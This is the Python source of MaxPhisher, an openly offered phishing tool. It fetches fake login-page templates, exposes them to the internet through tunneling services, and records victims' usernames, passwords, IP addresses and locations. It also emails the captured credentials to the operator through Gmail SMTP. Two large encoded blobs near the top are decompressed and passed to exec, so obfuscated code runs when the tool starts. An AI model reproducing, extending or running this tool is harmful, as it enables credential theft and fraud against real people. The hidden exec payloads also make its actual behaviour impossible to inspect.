# -*- coding: UTF-8 -*-
# ToolName   : MaxPhisher
# Author     : KasRoudra
# Version    : 1.0
# License    : GPL V3
# Copyright  : KasRoudra (2021-2022)
# Github     : https://github.com/KasRoudra
# Contact    : https://m.me/KasRoudra
# Description: MaxPhisher is a phishing tool in python
# Tags       : Multi phishing, login phishing, image phishing, video phishing, clipboard steal
# 1st Commit : 08/9/2022
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Credits    : PyPhisher, VidPhisher, CamHacker, IP-Tracker, StromBreaker, Seeker
# Env        : #!/usr/bin/env python


"""
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
"""

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'25536A1730FFFBEBFB6A9E6A60662D76E328EB895783E0338EBD221DB65CACB8138281D98906783F7197CF3E71D7AE05B8B1D4C732C71EEA376EBB6C99C6A37B173AE17044D0F845091EB4B2353822F0576930BD2B0F0531307BEBC0DF15D95A247D8669AA50757793483E09BF39815788633B496405005A44AB5612E467AC5F4D52190D3A9963B272E38286C36578282CCEA416EF911478C9730ABE0D0732A820A8D4F81D4BC993E15ED28BD72F681344949907F5FCDECBB868697965E9D2BE207B16B7A933968C3C5EE1470ED77E1315783B26107B12FE650AAED8CBD709943D32A0E9599A1B2B0496A20F692BE9B7B3D27736BC956CC0A067A0D37A2D89E476772C20E20035FE35EA2991260AD20BDE2A6CAFA9907C1B4A89AC03E6BCAE08B274AC0F13E0BFE7B1C30A6240757153C5E6D60BEF301B960B2D1DB77D1C24081610C6199FCB6C9C500EC8B2A57F0634C0D3F1B43C7AF292779E654263D880D11F8FECC040B14D86A8AA8B016373B58000CA41002792F386821FDBFAF1056F3988F4234EBC3CAB74E9FCC2B2ECE9B08D3C8D345ED89B238356EC62371BA0D2B3BACAD40CBC321997F5B66E119547ED85F2C4A6BF41B60B92E2E79886CF6F7D849955D7E83917090C1591F0328D2C657A3EDD36FED62BD53F0B7BF2A36A0F8E5864AE4BF258E3888F0A585338CBC65060D1A3C7718282B37825DA35C3BAE598B531615B99B5CA71A346A660E74259FCC56BB78F3CED4FE3EB2E39FD3671957D43F425A648730C0BB7B0D9E773973B16B43F176FB8D75D79B1B07C6DA6C5152F5B4AE96F0E0FA69309EB7975579C49E601FE256422CCECB5D236833FEE5F44EA84E7CEC13D091B466D6FCADBC6D5CC9759543DD2EC5572B16EBFA5E6BB21E333A241E4E56564DD9AB6D261D1F9D329A6C3253B06F8D5BF3DC227497916351A4AFDA6099A4AAF765B1B5DB5954B19D0E626226BDD4E9D311DAAD1619FE563A7AEA3EEA87F846989BC43DDC1DD9732785CD291A91D11CF1B52F5F97D7F7FBEBE7F3F7F9FEFF89C13CA4621C028C4FBE178B7611864BBAF1D9EC229BD73DD3DF838C013B1E8D54951C987'))

# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="1.0"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Generated by banner-generator. Github: https://github.com/KasRoudra/banner-generator

# Modifying this could be potentially dangerous
logo = f"""
{red} __  __            ____  _     _     _
{cyan}|  \/  | __ ___  _|  _ \| |__ (_)___| |__   ___ _ __
{yellow}| |\/| |/ _` \ \/ / |_) | '_ \| / __| '_ \ / _ \ '__|
{blue}| |  | | (_| |>  <|  __/| | | | \__ \ | | |  __/ |
{red}|_|  |_|\__,_/_/\_\_|   |_| |_|_|___/_| |_|\___|_|
{yellow}{" "*31}             [{blue}v{version}{yellow}]
{cyan}{" "*28}        [{blue}By {green}KasRoudra{cyan}]
"""

nr_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://ngrok.com
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://dashboard.ngrok.com/get-started/your-authtoken{yellow} and copy your authtoken
"""

lx_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://localxpose.io
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://localxpose.io/dashboard/access{yellow} and copy your authtoken
"""

packages = [ "php", "ssh" ]
modules = [ "requests", "bs4" ]
tunnelers = [ "ngrok", "cloudflared", "loclx" ]
processes = [ "php", "ssh", "ngrok", "cloudflared", "loclx", "localxpose", ]
extensions = [ "png", "gif", "webm", "mkv", "mp4", "mp3", "wav", "ogg" ]

try:
    test = popen("cd $HOME && pwd").read()
except:
    exit()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

for module in modules:
    try:
        eximport(module)
    except ImportError:
        try:
            print(f"Installing {module}")
            run(f"pip3 install {module}", shell=True)
        except:
            print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
            exit(1)
    except:
        exit(1)

for module in modules:
    try:
        eximport(module)
    except:
        print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
        exit(1)

from requests import get, head, Session
from bs4 import BeautifulSoup

# Get Columns of Screen
columns = get_terminal_size().columns

sites_repo = "https://github.com/KasRoudra2/maxfiles"
websites_url = f"{sites_repo}/archive/main.zip"
repo_branch = "maxfiles-main"

# CF = Cloudflared, NR = Ngrok, LX = LocalXpose, LHR = LocalHostRun

home = getenv("HOME")
sites_dir = f"{home}/.maxsites"
templates_file = f"{sites_dir}/templates.json"
tunneler_dir = f"{home}/.tunneler"
php_file = f"{tunneler_dir}/php.log"
cf_file = f"{tunneler_dir}/cf.log"
lx_file = f"{tunneler_dir}/loclx.log"
lhr_file = f"{tunneler_dir}/lhr.log"
site_dir = f"{home}/.site"
cred_file = f"{site_dir}/usernames.txt"
ip_file = f"{site_dir}/ip.txt"
info_file = f"{site_dir}/info.txt"
location_file = f"{site_dir}/location.txt"
log_file = f"{site_dir}/log.txt"
main_ip = "ip.txt"
main_info = "info.txt"
main_cred = "creds.txt"
main_location = "location.txt"
cred_json = "creds.json"
info_json = "info.json"
location_json = "location.json" 
email_file = "files/email.json"
error_file = "error.log"
is_mail_ok = False
redir_url = ""
email = ""
password = ""
receiver = ""
mask = ""
nr_command = f"{tunneler_dir}/ngrok"
cf_command = f"{tunneler_dir}/cloudflared"
lx_command = f"{tunneler_dir}/loclx"
if isdir("/data/data/com.termux/files/home"):
    termux = True
    nr_command = f"termux-chroot {nr_command}"
    cf_command = f"termux-chroot {cf_command}"
    lx_command = f"termux-chroot {lx_command}"
    saved_file = "/sdcard/.creds.txt"
else:
    termux = False
    saved_file = f"{home}/.creds.txt"


print(f"\n{info}Please wait!{nc}")

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'=IOK2AO4BY772VD77PVMRGJQLA53TLVJRWUAIITWY57WZNDJIUIGUAL6QCQ6JUSNNIYBDZ5K5DHZVJI3Y6CWD72NP376LMBVMB7724QLQCHP6MALHOGBPGZQFAOBDSKKHAIFHFYQG26SOKAYURTG7QIYUH4SXCMAWABN6UCVMIX2QXDCTGQAEX7JUA3LEYH4EX5B6YO5XFZHY3KM2YYECRVOIX5AUKRULROS7DTUYFSBAYXJ4PDQUWUEL7A4YGYM4BUCQGWP56TBJ5AB67D4OR5AJYYMCWMFS5ZPJPHUAFM2VZBAUGQC3XRHSU3VOAY6P5O4EE43EDNXWCLA65X5DFU33R7PXWOCQK5NURWXTVYUKK5FVGSZHR3TRFS5ODPMK7L3V2AHL7HB2V5ZVUZLTG4ZI223ACGPIMJ2VQPCGHTNCILA2HENFCQOVPYBVYEQUJ45WD2KK7JA2PY4QQ6H2UY3DMMBOSAGQO4K747KSXF3G47GL4FIMC6ULZJXXKEGNW5UPYVHSNU5YGPMKF2ZZIYMKPUALURZKOUHISI2MJQZYHSVTYTCZSX4O42ZIAPOA3P2DGCCNFA2TKCMWG4SXXLBMYP3BXKVBKEGPZXG5U3GNYF6FPMB27DJ6PD47ZVSNOM4KSK7YBXLZG6GZBT4LZJC6ER6BVA25ZLBH6RFJ34KORE5NY7MOBK64SR5R6DMRG27SUA22FQ3D4PAPVBSGPNMPR5PG7S2O5H5REJ5HEB5GBGBSKSULMELKAS7WFJ675OUIBMUBKKYHXGWIDMW4YLMSI45322LADCV5B6JVNI6EJPUXAYCQPSLZBAIJDMR35J6FKVVBAK6LMNVS4YWPX7SJ2B6QG6ZCYUFA57HZASDQX26VWWO6OCRPBLB7AI6FNY4VCUSKT5X7GLXYEJ5HLJJK6A62C5MEIEQ73YBBSYK4N5XFWVZUBN4H5JQXA7XO2B2BDG25RXBUXSDXLW62H3PMWH62TSC23QSKJ7VRIP2RAWPDANK64HVOM6OROBDBLMV3O2Q5JYE3ZGV4PXYLDJYEUW3QJLICG2TFZL74J5W6YVUXXTBKQZQTGANJHX7ZZ24DWDKKIXDE6SK4GN34FBKAOAH54TPI5LW3AAH4QLG42OHVHI7U4DIHRAQLYUR4QKFPYGR2JLA6THY6VYV2RIZXO2IKJNJ5KSJ253DRGWFQ3LR5GRAYCHYV5QZXRNDA34ODLCXF2DO7GAB6GSPSICGBJ3XUV55EL5VUKEMMPWMPPIWFSLMWK3P57IGD2X3RBG6JBZTFNDKXHNJ2DKC4MBJ2WTI5P5MP5FKNX2A2IZJCKRH5NL7VRKW4J7Y7XENQ67U57V2Q7TXT2NIS3QRSCTO6TKO4UORCG7B5KSYJ6IHMUCLXXHDQIATWI7QAICVKUK4BW4RJKBXEXYQGSMQPHYV25FB6J6JRB4DQPHMXXA3QGOUC34MQA5L46GTB4EP6SQESFIE3DMFBMNCGKTPVXSNAZYBYA7XYD5DBKLP24QPQDQBPJWDSCJ7OMGY2JZXNPEVU5M2BZ6VGBNID4YEWLYV2CINMNRH32V3GYX7AQ66AJMDJXZXHCYMJV5V4KRPAA6XOLHQ55QDXMZHZ32H4YDNPIWD4VENASLSWMR3Y6BIJEVAHT2U23J6LPH3VNQNLTLENHYSFECQTEARLZRU6TOMBXI2RFGU5VTWOAPGFHJSF2J5LDBEUOMED4N6OJVWZOFU5TAVZ3UAONUAKWOZQM6ONOXDIPW67IHIQAAQIGEA67YGQCIJPSYG3XG6YX5UV2Q3WV5GE7DOEUN3EY74GSXYSXXYEP2MGRQ4XCR2HUMYK2MDTSYD3CZZ4AWHLG7TBMKAAHYA47KS6E4SREYAAB2PTPNZG6XAO5ZA5JDHPJKY3WLISPUQLS4MEII366BTDZ6H7ECIZ7PS5M34WZZEETSTKARPVK7BSAHRU7I5ZL5G4H6H7NZQBOAIGNAL3NG3RYCHN4OW2E55ZO4XLAXS4VRFPBUUSZQPOUOJQ4RJJI4VQXIOAU7TU2BTUHC4IYZO6GIB7M4P32333WQYFAANSDHAW6SGXPNRVO7SPS2TJGK66RPCBEXSIUYDIGUKPIHNH5QU3QKPDGOTUVYY56H7Q7SIDGJ5RNEOOAVRZTFKZSEZYHNJ45MGUZGQKY6CYUEIWVQYLNKD6OH5Y6CHXIIYMDYSBKD5QCILNYY4KR2CHSKMPLXXUXFMIFJ6NVZR5YD7IZLNNZ7WHSEOKZRYP7HKJLPDAXXMZMBOUY6VCYSPEB73CAAEZ3AF2MVDQUNUFTDDOJ6DCJVV3XPHKLHECEVJTCQWAMNVE2PBO4MY47JQE6D36NKOUBO4HYF7P7IXQDTAYOGWPQOAOC5MLA5PFNTN4DES3T6LQP73LDSBIOTCUYD2QTX4LGSKV6U5VDBGQR2TSMHMUVBWWXQS22RKBV64ZZ3FYX4F35U5MVXMHJPQJAYYXXXJB73MNSYCQPAPJK6XX5MDJJ7OELS4HJP7BNFFQYAKSK6DYSAMNITMSCRXXH7KGBJGMHHPSA467FRASBVTGE5ST35KW3Q5EWWDS55HJGWX24P77WCYWL2DK6QQAPWK7ODFNTZCQEKWPZPAE2PBFTOIFM3QGYCTG7KTFZ44JV4VR6GS42C2CZL6NP6ELQD4XRZYVVXLRI4PQ3WCZKNHYCGE7NYB3BXAP4ISJ2CRINKTGE65BY53HOBOCJP2XCJPSRCYRQELBA3CSJXU22CH5AALEAAR2HB3OAGX45ZKVNQNX3DSX6N4OMMINJMXPKGFPDJ23Y5FZ2OQMDCAS4F3NOYR25ZAIQREGOMMEGAAKBYFOCF2USJIDNRXC4LCIM3CQMLKCBKR4KWVRYQWIWNNHACKYMK3YSDS4HL2KOQEFTR3SQTIVYCICYFDK6XRP4FLABC7D34CAU7QVAO76GP555AGCU2HOGVRR6TR2SHIBUD5RQC4DDUDBBKIARX7TYM3QCN5QHVKEMFCSAKA5AGEMSBZMDPHIOTE2X63GEEKSU647GPIY2UYMV4BEUAO3QARXHAKM5XD26LRLF7YFJHUGSKJJBQJLLDUV5FI3HRUAEF5M3D2K57BKVQXUZWHJDESEVKXZCCD3BIJ6XJYXTA34BWITYCVUKXVYSOVRVI576UN4VIAMQB57HQF73D66ILTDLZOA26S4CR467ZZTMUWBFZAXARFA67IMJSXVC6LJKCBPRNXP3LM37ORBIKQENUUYQZ32VY5H5QWA2J7QNIW3CUHPC5WJQJDMGK4QUSW7562ZP7SMDEEEMGBNHDSROKHAQJQPJLU6HAM3DAQXA65EJE2FYRFPDEQ2URTC2TRFKVJ5W6QXRD62NL37RP2D3QY7W5IH7DJJWBILNQXWPETFEWJEUU6HNTBZL7K26PDFFGL5ZQNJ7DLHM42GASTVKTAUMQUIAK4SKE7UHOKHSDT4RKYATL5K7254VVXC5GABBGMDCTQLYDU3XRBBAIIZRNKGYZUPSWOA7M2QK4BRBHJ5U4ZFHXTV2ZESAT3PNGPEAYDDYQQVGXCV4FBK4RPV2PMRKEOGVV5TXX3TDNNHFMRMRUEBK5JKJ5WPQC7Y3OU4TJERDI3ZVQ2AVVWYKDKSHAZ4MWQLL7A35B75Z6K3HUJFMKAOV4G3MWQJH35BAJUTU7VD625O5N7YEYU2VMZVMSLHWEYA32SBD3LSMIZBU3T7BASRKYOHJA22LWI64XWMMY7KJH56TA2LM5DFVPKQQV7ZWC42Z2DHUBCO2PVJ24WEPMLS6VC426H75V5L6QIKRSPPHUCZ37VWWZNLZI6GNORJU6EDFQVWJOI4QXROA3LTEZ5OX6QVRHVV5LANV7UHJKLFIYQU3MS4SK5NF4OHWSMU3HWTDILIIE5IAAHNUSSOQWTB6WJLO52ZRO2N7FMBFOC46YUSIRPHFIXH5CMFGFZ3F7XMNIWKIDKYM2D5XCV4PUCKUMAM3DUYCBA244GIPDEL5GZWG4XO2HGXK6OWTVUXNAZQAXLNTCNDE5TMKTRGMRWDOCD6F6PKENHULGNHRT6ZS2UR4OI7OV6UTJVTKUZXIKZ6MVZI6UTV6WQQFEL6UMJPBDTIT7SUWHFNKGRTV3FPHDIQPO4ZL5J2KAZXECMUKS2YBVW27ECPCGD2DYOO7IZUGA3EELOY45MEGI6U4WJ7MQWJHN72WJFFMF6NHE3TO2MB3MWRDMK7DLQISEUTGRUI2ZBBH64YAAIE6QFRGFNOXOPQFDC4XBDCEJWIYFWJKTZDW7IKTE5OCA7RKU2YRLTH5RJEZVQSHQX3SPMRG4V55TD63IP5BKHEJQNV5FDSMUCO62YF76CTT36KPIQPB4EBWDJFEDTHKPZOZEAH33EP6AMTSBPEQZH5GKYEV7CTUB7XWM3WTAO3Y5Q4BAUD7DJNEJWN5O6JW4JZSXA7FNDJ6S2M2LXWSAYWIQPA6POVHWP4UBJK5WQXS5BGTZ7BG2HJVPTBJPADZ3UWFXBUSVGE2GKU57XVKHWSGE6254XZXRMXQNC5B2E4W4IIFNXJYGQDRF6O7DDICX7IECVXUSLU2PRBRMUZH6RO6E36FZZFBY5BWH7G5EF6RJ5B6FXYMFCKODP6BJNLTMT7OV2ISYVJ6BKWTCQAQYMTLAGYZVCNSQAW5TCRHMNMODSB55QWGE7EGP7VWL6DB6CHIOCLKLJPUVRBXQO5I4YACPHOD254MPZYJLFFIOLEWGX4JSEL4CYPLBKWTHA6YNRZFZDHSXXHYTDEJEPXXLPYQTSV2ZYBA7JU263ZU4LYVF5CDXMECJRRL6SDQQHQYVZIALILJQ6XQI4XNGHXXC6SYZZKR6NPTXC2BDSUFKPDIBRHM5CG3KPESK3EFC4NJCKIVXX5MXU6743UM4YMS55SJSZMZLRJA4MUGVKXA2MLFSWTGMA7IVAGXA25SR5LDB7P5YY34HQQMSZQ5CK6QQVKESZT6OX7JLFLYARSOSQ5RVUJV757QR4RNJ3K24TLHUD33SAR6AD4KCWRT74S3SGHXPDQUZGY2B6OKCW7WZXNV5EVNQBEMCS3GFZQYGWV33MSLI6FONBGEVJPT4VRGHRVR4SEW5R2W5R7OY2G6UK4GJ5A3VBPWXO6B5FNXRCGQHQNWJFAZP32BCK6VWOVNFZ5DSGU6XBXRGL6DYZDBOAFGMBQWVSGR7IYFG5FCOKPJBXO52KKKG6H2O55EGH6WXX5A45DELWWIHEUOTCU6MIDRYX3OHOW3VPVPJ4IXZKZS4644X65CYPN4K56UUYPSDYN66Q4UQDNPO4BJPEXEHCILPRULW3RWYWNQ2W4QQNXORRZOTG7PRV5QRWETXY2PMZ44O2T43LCX3GSQ2Q3RRECFFAUOPTI4UGBVXJEIRYBG75TMKC4BGWKA2X3WC6NW3AXHJSWTFVHAW5UZBNIWBE37QYNF3JF63EELQEWAO3ZZCCWPZSTSZARWQQ6YQQ4DT43JTTHDBRIS455TBAC3UIL57HYQ5PLVK6KPTJI5ILELZ6E3NE4OXGSEJ5TAPKN3K4VED5YKMDQOGE6DQ5B4AV4ZRM4RY3TGL75VJ4TA4BGLS75EPM6DVNNQVWDRELEFW6YEK2LYH5VQFDMOFMVX3YWAYWCXVXQX3FKMMD5VQ5ELFZOOWAIZDSD7M3SVA4D32J6NEW63L4KVGFD5ETANLMLEBMDJGYG7EXQSFENBBV6GNW2NR37AWPKL6EZQPXZWS3WM37H7WJPDOTUIXDRXJ3IVJZUOMLGU5QG4OEBVS4WNH7WBC73QVG7DOGSB7X7MJ7IR4CMB3WRCMVNE4PFI6FWYAR5IBTLHEL447FJGM2MR2YTZMPMJF7FFVIIVORTZGIFIGDYNRK3N5ULMYVPXPLYHOAA3VOCXI6AL6D7ISMHZCDJ2RZMYLXQ7QEVUZKLFYLMHUSG77LHPL7GWHTWMO3JUTWQQCGR2MJAW3HWFZOISM76KMALTEY6CHASLRPMVV7YFUZQSHHPBDIELG76D25ZD6FX4LANQ45JW4DEDTJUOEWMW555Y62EYJSIGA74YW4CP25FDBWNF6SB73D4I4LOZS4XTPT3IJ5SRDOSF53CSYSBJDADLTYT6DEKXZ2PXAGRZBSY7NFOMEYFMXHULIYUFZXOVX5ZQP6BRR4NCLPVEV2OUC5THGW233DZ4JQSIN73B22RULSA544FQJV2GEQQF6GUUI5KLB6XIM4PHEBXUQ6BCYQKKA55H6XVHBOM4DV2XNNROY5RL543N3NYGW3TTTC4AWD36YVFRAOI43LNEIBNXJACMB4EX7VX76WKYOOVXPDM6ED4KSZ5K3T7PSUC75QLFARZKMZ5XM5X4C6QTSDGSD7PBVP5YEMEZNMPJE7UQ3GM73FUFHTJBTS4ZVZ4ISQM4U2VXHKJESHALGIHS43FNPD7UKGMGD54ISUI2QLEBX6HK5WGAUW23LNL4RDOAQOWFUNBSKBXXU5LWBNRNXFV4DFKHDB357QR62BPFEVUQCL4ZH7IOZRMXRNQZG76M3QFSYKKUHLMH42SQCN5ZZKPQCGZJPHWEHL2AXCZTXSP7IXVMGFXHJ2R5CBTURFWYMYTHKOK6F6QU6GWGSQI3HJIDPK7FGEZ46GUMY2BPYFOSW6OZTY3GGANX5XSLORSRRQCEX7Y5XJFWHOJP3EMKMJ4BRW46R76JFZN4IMS6WUNL7VDNIB7BHYPM4IGCAWD5EHAVZRL66ESYOEXLOUPCAUEEXXRPGWHDTRAX7FKCLM7NOXQ2FXN6NL5GSA42X4HALLBZUV3CUJM5ACN5HZGK7NSHB4SACPCPXFYWYGMUMYQ4R4WWMETWSQSD4RS6IY24TQGCMMI7ET6Z7YVOZ4QG6L6D7XUOGMOPQXYXVVFF2LPQ2RUHCZEEEG2FJQHGRE5MX7M7MF72G3GZZIRPFLAO5QYIFJKSOH5C6Y63HUYVKGIYDF5XRVGLN37LAE6TLFIYKUP7N5NQX5754LHZAEKYWIQANI6NWZ6WVKBGCN2SUJAULRHW4P75ZI6WUFLNE3LTVPGZQYL64C2ZRVZZYV54OR353CSHHZOF763EOXSHCZ4FTSNQNALG6AEAQSUS5NJTOZINUKH456REEK4EY4E4JZ4T6OULZ5BEX5WZYWAR5MSRCXUUQUWJWAVKRDPRHCI4S4T47WO7ICXOQBQBKFEHHNB2WOR3HVL7YPELMNG6GW756W4AWWXH5FHATHXKTHL66XJCLIHRWXTUJX54K5XOSIBNRKQYIGSGP5FVX27GYU22FZHE74VFABOJFHLTVWBMWZDEUL434XLWUKCFGR34XB5KPFEBWGEWI2M55R3MOK6FLOBNR4YO3OEX2FOWZPJDR5IME7KEXRC3VY2UIMX5WGCX2PDD75TVLCKXXW5GHDBXGKXS5ODANOJSHCSDGECK55NJNXRYQ3H7RLXWUXQMCRIJJ76M2IJOLFLEW6PKPASSWYZW6ZAE2CVULPXVSXOSZP64LZ6OFGJYUCZY2YQWJN65PBR5XHSUMOPRTWVJYSG53VHREWSTW4NY3XVXCBL4RPBYO5HEZ57R4YRSPZDP23GXPLS6ZOMPLJLT53JSBQM2FTO4GIWH2KW5POXFZ5XKEHXPXEXJKRIUDCU55SUHWRDRQOXUL2XG4BLGCL6EP7N5KL5CQJ4QTGIWDSTONBXYH5RDFOFS3XTCLTEMUXKCBMC726U3IFMU37TSKT2VK53LIL27CG47ECBJU7IX7EB76CZ3LN5MSLWBR46NNIYYUY4NJ32MDP7WY4A3SLLTGW2FA34B72JON3FVJFVIJNJWM4VQ7CF5ARUQ33PK3X5CZ6RVTJUQE4OMOLTRWIM4D7AL2XCW3V6XHK2RW2DHQSCLPLV5G5FSZDB3ZFE3FDNCJZE7NWQZFBVPR2H4V33NB3T2Q7BDDMBDH2EZKPFJ65IK53ZB26T7W54LBBCW4V7AJ2SDKMO56G3E7DCLOX2IXRJUTHIGHXJ65SXGNLBB3VK7Q2GRESG6SOWKMSYOY3J77EL2X3FWPU7OK6OZL25K7L3TZ5ROVFUB2FOJ3QETVNV4Z53YOKVC3S5HIJIORFOO244HXUZ3PDLD77XPP627773HP6Z777TXH77HP47QD4QJS6FGHVVNZ6VKE6Q65M5ENTNSBJCBYIEZAATWMFM4W25J7REKEQ3SLSJCG3BOCP'))


# Clear the screen and show logo
def clear(fast=False, lol=False):
    shell("clear")
    if fast:
        print(logo)
    elif lol:
        lolcat(logo)
    else:
        sprint(logo, 0.01)
        
        

# Install packages
def installer(package, package_name=None):
    if package_name is None:
        package_name = package
    for pacman in ["pkg", "apt", "apt-get", "apk", "yum", "dnf", "brew", "pacman"]:
        # Check if package manager is present but php isn't present
        if is_installed(pacman):
            if not is_installed(package):
                sprint(f"\n{info}Installing {package}{nc}")
                if pacman=="pacman":
                    shell(f"sudo {pacman} -S {package_name} --noconfirm")
                elif pacman=="apk":
                    if is_installed("sudo"):
                        shell(f"sudo {pacman} add {package_name}")
                    else:
                        shell(f"{pacman} add -y {package_name}")
                elif is_installed("sudo"):
                    shell(f"sudo {pacman} install -y {package_name}")
                else:
                    shell(f"{pacman} install -y {package_name}")
                break
    if is_installed("brew"):
        if not is_installed("ngrok"):
            shell("brew install ngrok/ngrok/ngrok")
        if not is_installed("cloudflare"):
            shell("brew install cloudflare/cloudflare/cloudflared")
        if not is_installed("localxpose"):
            shell("brew install localxpose")


# Process killer
def killer():
    # Previous instances of these should be stopped
    for process in processes:
        if is_running(process):
            # system(f"killall {process}")
            output = shell(f"pidof {process}", True).stdout.decode("utf-8").strip()
            if " " in output:
                for pid in output.split(" "):
                    kill(int(pid), SIGINT)
            elif output != "":
                kill(int(output), SIGINT)
            else:
                print()


# Internet Checker

def internet(url="https://api.github.com", timeout=5):
    while update:
        try:
            head(url=url, timeout=timeout)
            break
        except:
            print(f"\n{error}No internet!{nc}\007")
            sleep(2)
        
# Send mail by smtp library
def send_mail(msg):
    global email, password, receiver
    message = f"From: {email}\nTo: {receiver}\nSubject: MaxPhisher Login Credentials\n\n{msg}"
    try:
        internet()
        with smtp('smtp.gmail.com', 465) as server:
            server.login(email, password)
            server.sendmail(email, receiver, message) 
    except Exception as e:
        append(e, error_file)
        print(f"{error}{str(e)}")

# Bytes to KB, MB converter
def readable(byte, precision = 2, is_speed = False):
    for unit in ["Bt","KB","MB","GB"]:
        floatbyte = round(byte, precision)
        space = ' ' * (6 - len(str(floatbyte)))
        if byte < 1024.0:
            if is_speed:
                size = f"{floatbyte} {unit}/s{space}"
            else:
                size = f"{floatbyte} {unit}{space}"
            break
        byte /= 1024.0
    return size

# Download files with progress bar
def download(url, path, size=None):
    from time import ctime, time
    session = Session()
    filename = basename(path)
    directory = dirname(path)
    retry = 3
    if directory!="" and not isdir(directory):
        mkdir(directory)
    newfile = filename.split(".")[0] if "." in filename else filename
    newname = filename if len(filename) <= 12 else filename[:9]+"..."
    print(f"\n{info}Downloading {green}{newfile.title()}{nc}...\n")
    for i in range(retry):
        try:
            with open(path, "wb") as file:
                internet()
                response = session.get(url, stream=True, timeout=20)
                chunk_size = 4096 #KB
                total_length = response.headers.get('content-length')
                length = int(total_length or size or "0")
                downloaded = 0
                alldata = b""
                max_len = columns - 38
                newname_space = " " * (14 - len(newname))
                max_len2 = columns - 50
                pre_space = 0
                suf_space = max_len2
                stime = time()
                for data in response.iter_content(chunk_size=chunk_size):
                    etime = time()
                    downloaded += len(data)
                    alldata += data
                    speed = chunk_size/float(etime-stime)
                    readable_speed = readable(speed, is_speed=True)
                    file.write(data)
                    readable_size = readable(len(alldata))
                    if length == 0:
                        stdout.write(f"\r{newname}{newname_space}[{' '*pre_space}<=======>{' '*suf_space}] {readable_size} {readable_speed}")
                        stdout.flush()
                        if pre_space == max_len2:
                            forward = False
                        if suf_space == max_len2:
                            forward = True
                        if forward:
                            pre_space+=1
                            suf_space-=1
                        else:
                            pre_space-=1
                            suf_space+=1
                    else:
                        done = int(max_len * downloaded / length)
                        # Arrow will progress as the data increases with done
                        arrow = "=" * done
                        # Space will decrease as done increases
                        arrow_space = " " * (max_len - done)
                        percentage = round(downloaded * 100 / length, 2)
                        stdout.write(f"\r{newname}{newname_space}[{arrow}>{arrow_space}] {percentage}% {readable_speed}")
                        stdout.flush()
                    stime = time()
                if length == 0:
                    stdout.write(f"\r{newname}{newname_space}[<{'=' * (max_len2+7)}>] {readable_size}{' ' * 20}")
                else:
                    stdout.write(f"\r{newname}{newname_space}[{'=' * max_len}>] 100.0%{' ' * 20}")
                stdout.flush()
                # This print fixes the cursor to newline
                print()
                break
        except Exception as e:
            print()
            remove(path)
            append(e, error_file)
            print(f"{error}Download failed due to: {str(e)}")
            print(f"\n{info}Retrying {i}/{retry}{nc}")
            sleep(1)
    if not isfile(path):
        print(f"\n{error}Download failed permanently!")
        pexit()


# Extract zip/tar/tgz files
